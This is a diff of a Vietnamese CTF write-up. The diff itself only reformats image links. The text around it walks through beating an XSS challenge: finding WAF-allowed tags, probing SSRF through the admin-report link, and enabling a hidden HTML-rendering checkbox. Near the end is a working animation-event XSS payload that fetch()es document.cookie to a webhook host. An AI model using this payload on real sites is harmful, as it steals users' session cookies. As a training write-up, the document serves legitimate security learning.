@@ -17,7 +17,7 @@ https://security.stackexchange.com/questions/14038/does-dns-pinning-protect-agai
 ---
 
 Mình thấy bài tập có cung cấp các từ khóa bị chặn bởi WAF:
-![[Attachments/Pasted image 20261101135531.png]]
+![Pasted image 20261101135531](Attachments/Pasted%20image%2020261101135531.png)
 
 
 Do đó việc đầu tiên của mình làm là mình đã viết một script nho nhỏ để tìm xem tag/event nào ko bị chặn bằng cách copy tất cả tag/event trong XSS Cheat Sheet của PorrtSwigger:
@@ -33,10 +33,10 @@ Tag bypass:
 ['a', 'abbr', 'acronym', 'animate', 'animatemotion', 'animatetransform', 'area', 'article', 'aside', 'b', 'base', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'input', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'wbr', 'xmp', 'xss']
 ```
 /feature không tồn tại:
-![[Attachments/Pasted image 20261101140958.png]]
+![Pasted image 20261101140958](Attachments/Pasted%20image%2020261101140958.png)
 
 /admin bị 403:
-![[Attachments/Pasted image 20261101141011.png]]
+![Pasted image 20261101141011](Attachments/Pasted%20image%2020261101141011.png)
 
 
 Nhưng test một lúc thì mình thấy vô lý cực kì :)) Sao <> đều bị escape hết rồi thì XSS đường nào được ?? Khó hiểu. Nên mình đặt ra nghi vấn chắc là Challenge này đang troll troll, ko thể có XSS được:
@@ -49,11 +49,11 @@ Nhưng test một lúc thì mình thấy vô lý cực kì :)) Sao <> đều b�
 
 
 Sau đó mình test thêm thì thấy endpoint gửi report cho admin khá thú vị:
-![[Attachments/Pasted image 20261101135941.png]]
+![Pasted image 20261101135941](Attachments/Pasted%20image%2020261101135941.png)
 
 Nó nhận link trực tiếp ở local luôn, mình thử đổi bằng link webhook của mình thì vẫn nhận được request khá ảo :)) Nên mình nghĩ đến hướng SSRF:
-![[Attachments/Pasted image 20261101140259.png]]
-![[Attachments/Pasted image 20261101140617.png]]
+![Pasted image 20261101140259](Attachments/Pasted%20image%2020261101140259.png)
+![Pasted image 20261101140617](Attachments/Pasted%20image%2020261101140617.png)
 
 Trước hết thì mình thử các protocol đặc biệt như file://
 Mình ko biết có hoạt động không do chỉ hiện status ok ;-; Ko có gì đặc biệt nên tạm thời mình thử cách khác.
@@ -103,11 +103,11 @@ Tưởng  vậy là đã xong nhưng mình test mãi mà ko hiểu sao chỉ xem
 Mình tìm hiểu ra thì biết trình duyệt hiện đại có cơ chế PNA (Private Network Access): https://developer.chrome.com/blog/private-network-access-update-2024-03 và DNS Pinning: https://security.stackexchange.com/questions/14038/does-dns-pinning-protect-against-all-dns-rebinding-attacks.
 Mình thấy khó quá, không cách nào được thêm tiến bộ gì nữa nên tạm thời gác lại hướng này 😥
 
-![[Attachments/Pasted image 20261101141502.png]]
+![Pasted image 20261101141502](Attachments/Pasted%20image%2020261101141502.png)
 
 Thế là mình lại quay lại mò mẫm. Trong lúc tìm xem HTML có cái gì ko thì mình thấy một cái tuyệt vời và mình thấy ngay mấu chốt của bài tập ;))
 Ảo tung chảo thật sự, có một checkbox trong form Submit có tên 'enable-html-rendering':
-![[Attachments/Pasted image 20261101143651.png]]
+![Pasted image 20261101143651](Attachments/Pasted%20image%2020261101143651.png)
 
 Má, checkbox này được tàng hình bởi CSS :))) troll troll thật, thế là mình thêm `&enable-html-rendering=on` ở cuối mỗi request submit gửi đi, kết quả là render được thật.
 
@@ -125,7 +125,7 @@ Mình chọn tag `<b>` làm vector tấn công sau đó sử dụng XSS cheat sh
 ```html
 <style>@keyframes x{}</style><b style="animation-name:x" onwebkitanimationstart="print()"></b>
 ```
-![[Attachments/Pasted image 20261101144137.png]]
+![Pasted image 20261101144137](Attachments/Pasted%20image%2020261101144137.png)
 Ý tưởng dùng print() thay cho alert(1) mình cũng đọc trong một bài báo ở Port Swigger :D Do ở đây `alert` đã nằm trong keyword bị cấm: https://portswigger.net/research/alert-is-dead-long-live-print
 
 ```html
@@ -133,7 +133,7 @@ Mình chọn tag `<b>` làm vector tấn công sau đó sử dụng XSS cheat sh
 <b style="animation-name:x" onwebkitanimationstart="fetch('https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net/?c='+document.cookie)"></b>
 ```
 
-![[Attachments/Pasted image 20261101145158.png]]
+![Pasted image 20261101145158](Attachments/Pasted%20image%2020261101145158.png)
 
 Gửi cho Admin và mình dễ dàng có được Flag:
-![[Attachments/Pasted image 20261101145327.png]]
+![Pasted image 20261101145327](Attachments/Pasted%20image%2020261101145327.png)
